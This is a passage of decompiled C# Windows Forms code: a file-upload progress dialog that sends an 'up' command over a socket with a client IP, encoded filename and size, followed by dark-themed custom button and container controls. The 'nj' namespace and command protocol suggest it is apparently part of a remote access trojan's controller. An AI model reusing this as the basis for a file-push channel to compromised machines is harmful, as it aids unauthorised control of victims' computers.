				bool flag = this._ProgressBar1 != null;
				if (flag)
				{
					this._ProgressBar1.Click -= value2;
				}
				this._ProgressBar1 = value;
				flag = (this._ProgressBar1 != null);
				if (flag)
				{
					this._ProgressBar1.Click += value2;
				}
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual GroupBox GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox1 = value;
			}
		}

		internal virtual LV Lv1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Lv1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Lv1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = up.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = up.__ENCList.Count == up.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = up.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = up.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									up.__ENCList[num] = up.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						up.__ENCList.RemoveRange(num, up.__ENCList.Count - num);
						up.__ENCList.Capacity = up.__ENCList.Count;
					}
					up.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ListViewItem listViewItem = new ListViewItem("File Name");
			ListViewItem listViewItem2 = new ListViewItem("File Size");
			ListViewItem listViewItem3 = new ListViewItem("Speed");
			ListViewItem listViewItem4 = new ListViewItem("Uploaded");
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(up));
			this.ProgressBar1 = new ProgressBar();
			this.Button1 = new Button();
			this.Timer1 = new Timer(this.components);
			this.GroupBox1 = new GroupBox();
			this.Lv1 = new LV();
			this.ColumnHeader1 = new ColumnHeader();
			this.ColumnHeader2 = new ColumnHeader();
			this.GroupBox1.SuspendLayout();
			this.SuspendLayout();
			this.ProgressBar1.BackColor = SystemColors.ActiveCaptionText;
			Control arg_DB_0 = this.ProgressBar1;
			Point location = new Point(-6, 95);
			arg_DB_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_109_0 = this.ProgressBar1;
			Size size = new Size(582, 12);
			arg_109_0.Size = size;
			this.ProgressBar1.TabIndex = 1;
			this.Button1.BackColor = Color.Black;
			this.Button1.ForeColor = SystemColors.Control;
			Control arg_154_0 = this.Button1;
			location = new Point(409, 1);
			arg_154_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_182_0 = this.Button1;
			size = new Size(168, 91);
			arg_182_0.Size = size;
			this.Button1.TabIndex = 2;
			this.Button1.Text = "Stop";
			this.Button1.UseVisualStyleBackColor = false;
			this.GroupBox1.BackColor = Color.FromArgb(28, 28, 28);
			this.GroupBox1.Controls.Add(this.Lv1);
			this.GroupBox1.ForeColor = SystemColors.ButtonHighlight;
			Control arg_204_0 = this.GroupBox1;
			location = new Point(2, 1);
			arg_204_0.Location = location;
			this.GroupBox1.Name = "GroupBox1";
			Control arg_232_0 = this.GroupBox1;
			size = new Size(409, 91);
			arg_232_0.Size = size;
			this.GroupBox1.TabIndex = 3;
			this.GroupBox1.TabStop = false;
			this.Lv1.BackColor = Color.Black;
			this.Lv1.BorderStyle = BorderStyle.FixedSingle;
			this.Lv1.Columns.AddRange(new ColumnHeader[]
			{
				this.ColumnHeader1,
				this.ColumnHeader2
			});
			this.Lv1.Dock = DockStyle.Fill;
			this.Lv1.Font = new Font("Arial", 8f, FontStyle.Bold);
			this.Lv1.ForeColor = SystemColors.MenuBar;
			this.Lv1.FullRowSelect = true;
			this.Lv1.GridLines = true;
			this.Lv1.HeaderStyle = ColumnHeaderStyle.None;
			this.Lv1.Items.AddRange(new ListViewItem[]
			{
				listViewItem,
				listViewItem2,
				listViewItem3,
				listViewItem4
			});
			Control arg_348_0 = this.Lv1;
			location = new Point(3, 16);
			arg_348_0.Location = location;
			this.Lv1.Name = "Lv1";
			Control arg_376_0 = this.Lv1;
			size = new Size(403, 72);
			arg_376_0.Size = size;
			this.Lv1.TabIndex = 0;
			this.Lv1.UseCompatibleStateImageBehavior = false;
			this.Lv1.View = View.Details;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(41, 41, 41);
			size = new Size(575, 106);
			this.ClientSize = size;
			this.Controls.Add(this.GroupBox1);
			this.Controls.Add(this.Button1);
			this.Controls.Add(this.ProgressBar1);
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			size = new Size(591, 140);
			this.MaximumSize = size;
			size = new Size(591, 140);
			this.MinimumSize = size;
			this.Name = "up";
			this.Text = "Uploaded";
			this.GroupBox1.ResumeLayout(false);
			this.ResumeLayout(false);
		}

		public up()
		{
			base.FormClosing += new FormClosingEventHandler(this.up_FormClosing);
			base.Load += new EventHandler(this.up_Load);
			up.__ENCAddToList(this);
			base.FormClosing += new FormClosingEventHandler(this.up_FormClosing);
			base.Load += new EventHandler(this.up_Load);
			this.os = 0;
			this.InitializeComponent();
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				this.Lv1.Items[2].SubItems[1].Text = FN.Siz((long)(checked(this.ProgressBar1.Value - this.os)));
				this.os = this.ProgressBar1.Value;
				this.Lv1.Items[3].SubItems[1].Text = FN.Siz((long)this.ProgressBar1.Value);
			}
			catch (Exception expr_82)
			{
				ProjectData.SetProjectError(expr_82);
				Exception projectError = expr_82;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void up_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.FS.Close();
				this.FS.Dispose();
			}
			catch (Exception expr_1C)
			{
				ProjectData.SetProjectError(expr_1C);
				Exception projectError = expr_1C;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void up_Load(object sender, EventArgs e)
		{
			this.FS = new FileStream(this.TMP, FileMode.Open);
			this.Lv1.Items[0].SubItems[1].Text = new FileInfo(this.TMP).Name;
			this.Lv1.Items[1].SubItems[1].Text = FN.Siz((long)this.SZ);
			this.Lv1.Items[2].SubItems[1].Text = FN.Siz(0L);
			this.Lv1.Items[3].SubItems[1].Text = FN.Siz(0L);
			this.ProgressBar1.Maximum = this.SZ;
			this.c.Send(string.Concat(new string[]
			{
				"up",
				sokserver.Y,
				this.c.ip(),
				sokserver.Y,
				FN.ENB(ref this.FNNN),
				sokserver.Y,
				Conversions.ToString(this.SZ)
			}));
			this.Lv1.FX();
			this.Timer1.Enabled = true;
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			this.Close();
		}

		private void ProgressBar1_Click(object sender, EventArgs e)
		{
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class VisualStudioButton : Control
	{
		public enum __ImageAlignment
		{
			Left,
			Middle,
			Right
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private MouseState State;

		private Color _FontColour;

		private Color _BaseColour;

		private Color _IconColour;

		private Color _BorderColour;

		private Color _HoverColour;

		private Color _PressedColour;

		private bool _ShowBorder;

		private bool _ShowImage;

		private bool _ShowText;

		private Image _Image;

		private StringAlignment _TextAlignment;

		private VisualStudioButton.__ImageAlignment _ImageAlignment;

		[Category("Control")]
		public VisualStudioButton.__ImageAlignment ImageAlignment
		{
			get
			{
				return this._ImageAlignment;
			}
			set
			{
				bool flag = this._ShowText && value == VisualStudioButton.__ImageAlignment.Middle;
				if (flag)
				{
					this._ImageAlignment = VisualStudioButton.__ImageAlignment.Left;
				}
				else
				{
					this._ImageAlignment = value;
				}
				this.Invalidate();
			}
		}

		[Category("Control")]
		public Image ImageChoice
		{
			get
			{
				return this._Image;
			}
			set
			{
				this._Image = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public StringAlignment TextAlignment
		{
			get
			{
				return this._TextAlignment;
			}
			set
			{
				this._TextAlignment = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool ShowImage
		{
			get
			{
				return this._ShowImage;
			}
			set
			{
				this._ShowImage = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool ShowText
		{
			get
			{
				return this._ShowText;
			}
			set
			{
				bool flag = this._ImageAlignment == VisualStudioButton.__ImageAlignment.Middle && this.ShowImage && value;
				if (flag)
				{
					this._ImageAlignment = VisualStudioButton.__ImageAlignment.Left;
				}
				this._ShowText = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool ShowBorder
		{
			get
			{
				return this._ShowBorder;
			}
			set
			{
				this._ShowBorder = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color HoverColour
		{
			get
			{
				return this._HoverColour;
			}
			set
			{
				this._HoverColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VisualStudioButton.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VisualStudioButton.__ENCList.Count == VisualStudioButton.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = VisualStudioButton.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = VisualStudioButton.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									VisualStudioButton.__ENCList[num] = VisualStudioButton.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						VisualStudioButton.__ENCList.RemoveRange(num, VisualStudioButton.__ENCList.Count - num);
						VisualStudioButton.__ENCList.Capacity = VisualStudioButton.__ENCList.Count;
					}
					VisualStudioButton.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			base.OnMouseEnter(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			this.State = MouseState.Down;
			this.Invalidate();
		}

		public VisualStudioButton()
		{
			VisualStudioButton.__ENCAddToList(this);
			this.State = MouseState.None;
			this._FontColour = Color.FromArgb(153, 153, 153);
			this._BaseColour = Color.FromArgb(45, 45, 48);
			this._IconColour = Color.FromArgb(255, 255, 255);
			this._BorderColour = Color.FromArgb(15, 15, 18);
			this._HoverColour = Color.FromArgb(60, 60, 62);
			this._PressedColour = Color.FromArgb(37, 37, 39);
			this._ShowBorder = true;
			this._ShowImage = false;
			this._Image = null;
			this._TextAlignment = StringAlignment.Center;
			this._ImageAlignment = VisualStudioButton.__ImageAlignment.Left;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = this._BaseColour;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.AntiAlias;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			switch (this.State)
			{
			case MouseState.None:
			{
				Graphics arg_67_0 = graphics2;
				Brush arg_67_1 = new SolidBrush(this._BaseColour);
				Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
				arg_67_0.FillRectangle(arg_67_1, rectangle);
				break;
			}
			case MouseState.Over:
			{
				Graphics arg_93_0 = graphics2;
				Brush arg_93_1 = new SolidBrush(this._HoverColour);
				Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
				arg_93_0.FillRectangle(arg_93_1, rectangle);
				break;
			}
			case MouseState.Down:
			{
				Graphics arg_BF_0 = graphics2;
				Brush arg_BF_1 = new SolidBrush(this._PressedColour);
				Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
				arg_BF_0.FillRectangle(arg_BF_1, rectangle);
				break;
			}
			}
			bool flag = this._ShowBorder;
			if (flag)
			{
				Graphics arg_FA_0 = graphics2;
				Pen arg_FA_1 = new Pen(this._BorderColour, 1f);
				Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
				arg_FA_0.DrawRectangle(arg_FA_1, rectangle);
			}
			flag = this._ShowImage;
			checked
			{
				if (flag)
				{
					bool showText = this._ShowText;
					if (showText)
					{
						bool flag2 = this.Width > 50 && this.Height > 30;
						if (flag2)
						{
							bool flag3 = this._ImageAlignment == VisualStudioButton.__ImageAlignment.Left;
							if (flag3)
							{
								Graphics arg_178_0 = graphics2;
								Image arg_178_1 = this._Image;
								Rectangle rectangle = new Rectangle(10, 10, this.Height - 20, this.Height - 20);
								arg_178_0.DrawImage(arg_178_1, rectangle);
								Graphics arg_1E8_0 = graphics2;
								string arg_1E8_1 = this.Text;
								Font arg_1E8_2 = this.Font;
								Brush arg_1E8_3 = new SolidBrush(this._FontColour);
								rectangle = new Rectangle(0 + (this.Height - 5), 0, this.Width - 20 - (this.Height - 10), this.Height);
								arg_1E8_0.DrawString(arg_1E8_1, arg_1E8_2, arg_1E8_3, rectangle, new StringFormat
								{
									Alignment = this._TextAlignment,
									LineAlignment = StringAlignment.Center
								});
							}
							else
							{
								flag3 = (this._ImageAlignment == VisualStudioButton.__ImageAlignment.Right);
								if (flag3)
								{
									Graphics arg_23C_0 = graphics2;
									Image arg_23C_1 = this._Image;
									Rectangle rectangle = new Rectangle(this.Width - 20 - (this.Height - 20), 10, this.Height - 20, this.Height - 20);
									arg_23C_0.DrawImage(arg_23C_1, rectangle);
									Graphics arg_2A4_0 = graphics2;
									string arg_2A4_1 = this.Text;
									Font arg_2A4_2 = this.Font;
									Brush arg_2A4_3 = new SolidBrush(this._FontColour);
									rectangle = new Rectangle(10, 0, this.Width - 20 - (this.Height - 20), this.Height);
									arg_2A4_0.DrawString(arg_2A4_1, arg_2A4_2, arg_2A4_3, rectangle, new StringFormat
									{
										Alignment = this._TextAlignment,
										LineAlignment = StringAlignment.Center
									});
								}
							}
						}
						else
						{
							Graphics arg_306_0 = graphics2;
							string arg_306_1 = this.Text;
							Font arg_306_2 = this.Font;
							Brush arg_306_3 = new SolidBrush(this._FontColour);
							Rectangle rectangle = new Rectangle(10, 0, this.Width - 20, this.Height);
							arg_306_0.DrawString(arg_306_1, arg_306_2, arg_306_3, rectangle, new StringFormat
							{
								Alignment = this._TextAlignment,
								LineAlignment = StringAlignment.Center
							});
						}
					}
					else
					{
						bool flag3 = this._ImageAlignment == VisualStudioButton.__ImageAlignment.Left;
						if (flag3)
						{
							Graphics arg_348_0 = graphics2;
							Image arg_348_1 = this._Image;
							Rectangle rectangle = new Rectangle(10, 10, this.Height - 20, this.Height - 20);
							arg_348_0.DrawImage(arg_348_1, rectangle);
						}
						else
						{
							flag3 = (this._ImageAlignment == VisualStudioButton.__ImageAlignment.Middle);
							if (flag3)
							{
								Graphics arg_3B2_0 = graphics2;
								Image arg_3B2_1 = this._Image;
								Rectangle rectangle = new Rectangle((int)Math.Round(unchecked((double)this.Width / 2.0 - (double)(checked(this.Height - 20)) / 2.0)), 10, this.Height - 20, this.Height - 20);
								arg_3B2_0.DrawImage(arg_3B2_1, rectangle);
							}
							else
							{
								Graphics arg_3F2_0 = graphics2;
								Image arg_3F2_1 = this._Image;
								Rectangle rectangle = new Rectangle(this.Width - 10 - (this.Height - 20), 10, this.Height - 20, this.Height - 20);
								arg_3F2_0.DrawImage(arg_3F2_1, rectangle);
							}
						}
					}
				}
				else
				{
					bool flag3 = this._ShowText;
					if (flag3)
					{
						Graphics arg_461_0 = graphics2;
						string arg_461_1 = this.Text;
						Font arg_461_2 = this.Font;
						Brush arg_461_3 = new SolidBrush(this._FontColour);
						Rectangle rectangle = new Rectangle(10, 0, this.Width - 20, this.Height);
						arg_461_0.DrawString(arg_461_1, arg_461_2, arg_461_3, rectangle, new StringFormat
						{
							Alignment = this._TextAlignment,
							LineAlignment = StringAlignment.Center
						});
					}
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class VisualStudioContainer : ContainerControl
	{
		public enum __IconStyle
		{
			VSIcon,
			FormIcon
		}

		public enum __FormOrWhole
		{
			WholeApplication,
			Form
		}

		private delegate void _InvokeForm(MouseEventArgs e);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private bool _AllowClose;

		private bool _AllowMinimize;

		private bool _AllowMaximize;

		private int _FontSize;

		private bool _ShowIcon;

		private MouseState State;

		private int MouseXLoc;

		private int MouseYLoc;

		private bool CaptureMovement;

		private const int MoveHeight = 35;

		private Point MouseP;

		private Color _FontColour;

		private Color _BaseColour;

		private Color _IconColour;

		private Color _ControlBoxColours;

		private Color _BorderColour;

		private Color _HoverColour;

		private Color _PressedColour;

		private Font _Font;

		private VisualStudioContainer.__IconStyle _IconStyle;

		private VisualStudioContainer.__FormOrWhole _FormOrWhole;

		private Form _Form;

		private Point[] Points1;

		private Point[] Points2;

		private Point[] Points3;

		private Point[] Points4;

		[Category("Control")]
		public VisualStudioContainer.__FormOrWhole FormOrWhole
		{
			get
			{
				return this._FormOrWhole;
			}
			set
			{
				this._FormOrWhole = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public Form Form
		{
			get
			{
				return this._Form;
			}
			set
			{
				bool flag = value == null;
				if (!flag)
				{
					this._Form = value;
					this.Invalidate();
				}
			}
		}

		[Category("Control")]
		public VisualStudioContainer.__IconStyle IconStyle
		{
			get
			{
				return this._IconStyle;
			}
			set
			{
				this._IconStyle = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public int FontSize
		{
			get
			{
				return this._FontSize;
			}
			set
			{
				this._FontSize = value;
			}
		}

		[Category("Control")]
		public bool AllowMinimize
		{
			get
			{
				return this._AllowMinimize;
			}
			set
			{
				this._AllowMinimize = value;
			}
		}

		[Category("Control")]
		public bool AllowMaximize
		{
			get
			{
				return this._AllowMaximize;
			}
			set
			{
				this._AllowMaximize = value;
			}
		}

		[Category("Control")]
		public bool ShowIcon
		{
			get
			{
				return this._ShowIcon;
			}
			set
			{
				this._ShowIcon = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool AllowClose
		{
			get
			{
				return this._AllowClose;
			}
			set
			{
				this._AllowClose = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color HoverColour
		{
			get
			{
				return this._HoverColour;
			}
			set
			{
				this._HoverColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VisualStudioContainer.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VisualStudioContainer.__ENCList.Count == VisualStudioContainer.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = VisualStudioContainer.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = VisualStudioContainer.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									VisualStudioContainer.__ENCList[num] = VisualStudioContainer.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						VisualStudioContainer.__ENCList.RemoveRange(num, VisualStudioContainer.__ENCList.Count - num);
						VisualStudioContainer.__ENCList.Capacity = VisualStudioContainer.__ENCList.Count;
					}
					VisualStudioContainer.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.CaptureMovement = false;
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			base.OnMouseEnter(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		protected override void OnMouseMove(MouseEventArgs e)
		{
			base.OnMouseMove(e);
			this.MouseXLoc = e.Location.X;
			this.MouseYLoc = e.Location.Y;
			this.Invalidate();
			bool flag = this.CaptureMovement;
			if (flag)
			{
				this.Parent.Location = Control.MousePosition - (Size)this.MouseP;
			}
			flag = (e.Y > 26);
			if (flag)
			{
				this.Cursor = Cursors.Arrow;
			}
			else
			{
				this.Cursor = Cursors.Hand;
			}
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			checked
			{
				bool flag = this.MouseXLoc > this.Width - 30 && this.MouseXLoc < this.Width && this.MouseYLoc < 26;
				if (flag)
				{
					bool allowClose = this._AllowClose;
					if (allowClose)
					{
						bool flag2 = this._FormOrWhole == VisualStudioContainer.__FormOrWhole.Form;
						if (flag2)
						{
							bool flag3 = this._Form == "(none)";
							if (flag3)
							{
								Environment.Exit(0);
							}
							else
							{
								flag3 = this._Form.InvokeRequired;
								if (flag3)
								{
									this._Form.Invoke(new VisualStudioContainer._InvokeForm(this.OnMouseDown), new object[]
									{
										e
									});
								}
								else
								{
									this._Form.Close();
								}
							}
						}
						else
						{
							Environment.Exit(0);
						}
					}
				}
				else
				{
					bool flag3 = this.MouseXLoc > this.Width - 60 && this.MouseXLoc < this.Width - 30 && this.MouseYLoc < 26;
					if (flag3)
					{
						bool flag2 = this._AllowMaximize;
						if (flag2)
						{
							switch (this.FindForm().WindowState)
							{
							case FormWindowState.Normal:
								this.FindForm().WindowState = FormWindowState.Maximized;
								break;
							case FormWindowState.Maximized:
								this.FindForm().WindowState = FormWindowState.Normal;
								break;
							}
						}
					}
					else
					{
						flag3 = (this.MouseXLoc > this.Width - 90 && this.MouseXLoc < this.Width - 60 && this.MouseYLoc < 26);
						if (flag3)
						{
							bool flag2 = this._AllowMinimize;
							if (flag2)
							{
								switch (this.FindForm().WindowState)
								{
								case FormWindowState.Normal:
									this.FindForm().WindowState = FormWindowState.Minimized;
									break;
								case FormWindowState.Maximized:
									this.FindForm().WindowState = FormWindowState.Minimized;
									break;
								}
							}
						}
						else
						{
							bool arg_216_0 = e.Button == MouseButtons.Left;
							Rectangle rectangle = new Rectangle(0, 0, this.Width - 90, 35);
							Rectangle rectangle2 = rectangle;
							flag3 = (arg_216_0 & rectangle2.Contains(e.Location));
							if (flag3)
							{
								this.CaptureMovement = true;
								this.MouseP = e.Location;
							}
							else
							{
								bool arg_269_0 = e.Button == MouseButtons.Left;
								rectangle2 = new Rectangle(this.Width - 90, 22, 75, 13);
								rectangle = rectangle2;
								flag3 = (arg_269_0 & rectangle.Contains(e.Location));
								if (flag3)
								{
									this.CaptureMovement = true;
									this.MouseP = e.Location;
								}
								else
								{
									bool arg_2B8_0 = e.Button == MouseButtons.Left;
									rectangle2 = new Rectangle(this.Width - 15, 0, 15, 35);
									rectangle = rectangle2;
									flag3 = (arg_2B8_0 & rectangle.Contains(e.Location));
									if (flag3)
									{
										this.CaptureMovement = true;
										this.MouseP = e.Location;
									}
									else
									{
										this.Focus();
									}
								}
							}
						}
					}
				}
				this.State = MouseState.Down;
				this.Invalidate();
			}
		}

		public VisualStudioContainer()
		{
			VisualStudioContainer.__ENCAddToList(this);
			this._AllowClose = true;
			this._AllowMinimize = true;
			this._AllowMaximize = true;
			this._FontSize = 12;
			this._ShowIcon = true;
			this.State = MouseState.None;
			this.CaptureMovement = false;
			this.MouseP = new Point(0, 0);
			this._FontColour = Color.FromArgb(153, 153, 153);
			this._BaseColour = Color.FromArgb(45, 45, 48);
			this._IconColour = Color.FromArgb(255, 255, 255);
			this._ControlBoxColours = Color.FromArgb(248, 248, 248);
			this._BorderColour = Color.FromArgb(15, 15, 18);
			this._HoverColour = Color.FromArgb(63, 63, 65);
			this._PressedColour = Color.FromArgb(0, 122, 204);
			this._Font = new Font("Microsoft Sans Serif", 9f);
			this._IconStyle = VisualStudioContainer.__IconStyle.FormIcon;
			this._FormOrWhole = VisualStudioContainer.__FormOrWhole.WholeApplication;
			this._Form = Form.ActiveForm;
			Point[] array = new Point[2];
			Point[] arg_12D_0_cp_0 = array;
			int arg_12D_0_cp_1 = 0;
			Point point = new Point(9, 11);
			arg_12D_0_cp_0[arg_12D_0_cp_1] = point;
			Point[] arg_146_0_cp_0 = array;
			int arg_146_0_cp_1 = 1;
			Point point2 = new Point(16, 17);
			arg_146_0_cp_0[arg_146_0_cp_1] = point2;
			this.Points1 = array;
			array = new Point[2];
			Point[] arg_16D_0_cp_0 = array;
			int arg_16D_0_cp_1 = 0;
			point2 = new Point(9, 22);
			arg_16D_0_cp_0[arg_16D_0_cp_1] = point2;
			Point[] arg_186_0_cp_0 = array;
			int arg_186_0_cp_1 = 1;
			point = new Point(16, 17);
			arg_186_0_cp_0[arg_186_0_cp_1] = point;
			this.Points2 = array;
			array = new Point[2];
			Point[] arg_1AD_0_cp_0 = array;
			int arg_1AD_0_cp_1 = 0;
			point2 = new Point(16, 17);
			arg_1AD_0_cp_0[arg_1AD_0_cp_1] = point2;
			Point[] arg_1C5_0_cp_0 = array;
			int arg_1C5_0_cp_1 = 1;
			point = new Point(26, 7);
			arg_1C5_0_cp_0[arg_1C5_0_cp_1] = point;
			this.Points3 = array;
			array = new Point[2];
			Point[] arg_1EC_0_cp_0 = array;
			int arg_1EC_0_cp_1 = 0;
			point2 = new Point(16, 17);
			arg_1EC_0_cp_0[arg_1EC_0_cp_1] = point2;
			Point[] arg_205_0_cp_0 = array;
			int arg_205_0_cp_1 = 1;
			point = new Point(25, 26);
			arg_205_0_cp_0[arg_205_0_cp_1] = point;
			this.Points4 = array;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = this._BaseColour;
			this.Dock = DockStyle.Fill;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
